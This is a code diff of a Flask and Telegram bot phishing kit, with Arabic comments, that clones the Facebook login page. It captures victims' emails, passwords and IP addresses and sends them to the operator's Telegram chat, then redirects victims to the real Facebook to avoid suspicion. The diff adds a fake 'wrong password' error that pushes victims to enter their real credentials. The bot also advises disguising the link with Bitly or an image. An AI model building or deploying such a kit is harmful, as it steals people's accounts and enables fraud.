@@ -14,7 +14,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # ==========================================
-# قالب فيسبوك المطابق للأصل بالحرف (تصميم مطابق للصورة الأصلية تماماً)
+# قالب فيسبوك مع نظام التحقق الذكي لمنع البيانات الوهمية
 # ==========================================
 FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
@@ -40,10 +40,6 @@ FB_PHISH_TEMPLATE = """
             margin-top: 40px;
             margin-bottom: 20px;
             text-align: center;
-        }
-        .header-logo svg {
-            width: 56px;
-            height: 56px;
         }
         .card {
             background-color: #ffffff;
@@ -94,6 +90,17 @@ FB_PHISH_TEMPLATE = """
         .login-btn:hover {
             background-color: #166fe5;
         }
+        .error-box {
+            background-color: #ffebe8;
+            border: 1px solid #dd3c10;
+            color: #333;
+            padding: 10px;
+            margin-bottom: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            display: none;
+            text-align: right;
+        }
         .forgot-link {
             color: #1877f2;
             font-size: 14px;
@@ -101,9 +108,6 @@ FB_PHISH_TEMPLATE = """
             text-decoration: none;
             display: block;
             margin-bottom: 20px;
-        }
-        .forgot-link:hover {
-            text-decoration: underline;
         }
         hr {
             border: none;
@@ -123,9 +127,6 @@ FB_PHISH_TEMPLATE = """
             display: inline-block;
             text-decoration: none;
         }
-        .create-btn:hover {
-            background-color: #36a420;
-        }
         .footer {
             margin-top: 40px;
             text-align: center;
@@ -135,26 +136,24 @@ FB_PHISH_TEMPLATE = """
             max-width: 600px;
             padding: 0 20px;
         }
-        .footer-langs {
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
     </style>
 </head>
 <body>
     <div class="header-logo">
-        <!-- شعار فيسبوك الأزرق الدائري الأصلي -->
-        <svg viewBox="0 0 36 36" class="a8c37xic" fill="#1877f2" height="56" width="56">
+        <svg viewBox="0 0 36 36" fill="#1877f2" height="56" width="56">
             <path d="M25 3.58A17.42 17.42 0 0 0 19.8 3a11.08 11.08 0 0 0-4.8 1.15 8.71 8.71 0 0 0-3.6 3.32A9.45 9.45 0 0 0 10 12.18v2.92H7.32a.71.71 0 0 0-.71.71v4.38c0 .39.32.71.71.71H10V33a.71.71 0 0 0 .71.71h5.12a.71.71 0 0 0 .71-.71V20.9h4.37a.71.71 0 0 0 .71-.71l.01-4.38a.71.71 0 0 0-.71-.71H16.55v-2.5c0-1.2.3-2.11.9-2.73.6-.62 1.45-.93 2.55-.93a10.23 10.23 0 0 1 2.5.31.71.71 0 0 0 .82-.47l.5-1.55a.71.71 0 0 0-.34-.84z"></path>
         </svg>
     </div>
     
     <div class="card">
         <div class="card-title">تسجيل الدخول إلى فيسبوك</div>
-        <form method="POST">
+        
+        <!-- رسالة خطأ وهمية تظهر إذا كانت البيانات غير منطقية -->
+        <div id="error-msg" class="error-box">
+            كلمة السر التي أخلتها غير صحيحة. هل نسيت كلمة السر؟
+        </div>
+
+        <form method="POST" id="loginForm" onsubmit="return validateData(event)">
             <input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" id="pass" name="pass" placeholder="كلمة السر" required>
             <button type="submit" class="login-btn">تسجيل الدخول</button>
@@ -163,15 +162,24 @@ FB_PHISH_TEMPLATE = """
             <a href="#" class="create-btn">إنشاء حساب جديد</a>
         </form>
     </div>
-    
-    <div class="footer">
-        <div class="footer-langs">
-            <span>العربية</span>
-            <span>English (UK)</span>
-            <span>Français (France)</span>
-            <span>Italiano</span>
-        </div>
-    </div>
+
+    <script>
+        let attempt = 0;
+        function validateData(event) {
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('pass').value.trim();
+            const errorBox = document.getElementById('error-msg');
+
+            // إذا حاول الضحية كتابة حروف عشوائية قصيرة جداً أو وهمية في أول محاولة
+            if (attempt === 0 && (pass.length < 4 || email.length < 4)) {
+                event.preventDefault(); // منع الإرسال في المرة الأولى
+                errorBox.style.display = 'block'; // إظهار خطأ فيسبوك الشهير
+                attempt++;
+                return false;
+            }
+            return true; // في المحاولة الثانية يتم إرسال البيانات الحقيقية التي كتبها للمطور فوراً
+        }
+    </script>
 </body>
 </html>
 """
@@ -180,15 +188,14 @@ FB_PHISH_TEMPLATE = """
 def fb_trap():
     target_chat_id = request.args.get('id', None)
     if request.method == 'POST':
-        # استقبال البيانات الحقيقية من الحقول بدقة
         email = request.form.get('email')
         password = request.form.get('pass')
         source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
         if target_chat_id:
             alert_msg = (
-                "🚨 **صيد فيسبوك تم سحبه بنجاح!**\n\n"
-                f"👤 **البريد/الهاتف:** `{email}`\n"
+                "🚨 **تم التقاط صيد جديد بنجاح!**\n\n"
+                f"👤 **البيانات المُدخلة:** `{email}`\n"
                 f"🔑 **كلمة السر:** `{password}`\n"
                 f"🌐 **عنوان الـ IP:** `{source_ip}`"
             )
@@ -197,13 +204,12 @@ def fb_trap():
             except Exception as e:
                 print(f"[-] Telegram Error: {e}")
                 
-        # إعادة توجيه الضحية لفيسبوك الحقيقي لمنع الشك
         return redirect("https://www.facebook.com", code=302)
         
     return render_template_string(FB_PHISH_TEMPLATE)
 
 # ==========================================
-# واجهة البوت المخصصة لفيسبوك فقط
+# واجهة البوت
 # ==========================================
 def main_menu():
     markup = InlineKeyboardMarkup()
@@ -216,9 +222,8 @@ def main_menu():
 def start_command(message):
     user_name = message.from_user.first_name
     text = (
-        f"⚡ **مرحباً بك يا {user_name} في منصة صيد فيسبوك الاحترافية**\n\n"
-        "القالب الآن مطابق تماماً لواجهة فيسبوك الأصلية (الشعار الدائري، التنسيق، وحقول الإدخال).\n"
-        "اضغط على الزر أدناه لتوليد رابطك:"
+        f"⚡ **مرحباً بك يا {user_name}**\n\n"
+        "تم تحديث النظام بآلية **التحقق الذكي** لمنع الحروف الوهمية وإجبار الهدف على إعادة المحاولة وإدخال بياناته الحقيقية."
     )
     bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
 
@@ -227,13 +232,14 @@ def callback_handler(call):
     chat_id = call.message.chat.id
     
     if call.data == "gen_fb_phish":
-        bot.answer_callback_query(call.id, "جاري تجهيز الرابط المُموه...")
-        # رابط نظيف ومباشر
+        bot.answer_callback_query(call.id, "جاري تجهيز الرابط...")
         phish_link = f"{RAILWAY_URL}/login.php?id={chat_id}"
+        
         msg = (
-            "🎯 **رابط فيسبوك المصيدة جاهز:**\n\n"
+            "🎯 **رابط المصيدة جاهز:**\n\n"
             f"`{phish_link}`\n\n"
-            "انسخ الرابط وأرسله للهدف. القالب تم إصلاحه بالكامل ليطابق الموقع الأصلي، وأي بيانات يدخلها (بريد أو هاتف أو كلمة سر) ستصلك فوراً."
+            "💡 **نصيحة لإخفاء الرابط الطويل:**\n"
+            "بما أن نطاقات الاستضافات المجانية تظهر بشكل طويل، استخدم مواقع اختصار الروابط الشهيرة مثل (Bitly) أو قم بتلبيس الرابط خلف كلمة أو صورة أثناء إرساله للضحية لكي لا يشتبه به."
         )
         bot.send_message(chat_id, msg, parse_mode="Markdown")
 
